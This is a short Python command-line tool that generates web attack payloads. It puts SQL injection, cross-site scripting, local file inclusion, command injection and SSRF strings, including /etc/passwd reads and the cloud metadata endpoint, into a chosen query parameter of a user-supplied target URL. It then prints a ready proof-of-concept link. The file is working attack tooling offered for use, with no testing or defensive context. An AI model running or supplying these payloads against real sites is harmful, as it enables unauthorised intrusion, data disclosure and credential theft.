#!/usr/bin/env python3
import os
import sys
import json
import random
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


PAYLOADS = {
    'sql_injection': [
        "' OR '1'='1' -- -",
        "' AND SLEEP(5)-- -",
        "' UNION SELECT NULL,@@version,NULL -- -",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) -- -"
    ],
    'xss': [
        '<script>alert(1)</script>',
        '" onmouseover="alert(1)"',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>'
    ],
    'lfi': [
        '../../../../../etc/passwd',
        '../../../../../etc/passwd%00',
        'php://filter/convert.base64-encode/resource=index.php',
        '/proc/self/environ'
    ],
    'rce': [
        ';id;',
        '& whoami & ipconfig',
        ';system("id")',
        ';__import__("os").system("id")'
    ],
    'ssrf': [
        'http://127.0.0.1/',
        'http://localhost/',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd'
    ]
}


def mutate_url(url: str, parameter: str, payload: str) -> str:
    parsed = urlparse(url)
    q = parse_qs(parsed.query)
    if parameter in q:
        q[parameter] = [payload]
    new_query = urlencode({k: v[0] for k, v in q.items()}, doseq=False)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def generate(url: str, vuln_type: str, parameter: str = None) -> dict:
    payload = random.choice(PAYLOADS.get(vuln_type, ['']))
    poc = payload
    if parameter:
        poc = mutate_url(url, parameter, payload)
    return {
        'type': vuln_type,
        'target': url,
        'parameter': parameter,
        'payload': payload,
        'poc': poc
    }


def main():
    parser = argparse.ArgumentParser(description='Enhanced AI Payload Generator')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('vuln_type', help='Vulnerability type (sql_injection, xss, lfi, rce, ssrf)')
    parser.add_argument('--param', help='Parameter name to inject into')
    args = parser.parse_args()

    result = generate(args.url, args.vuln_type, args.param)
    print(json.dumps(result, indent=2))


if __name__ == '__main__':
    main()


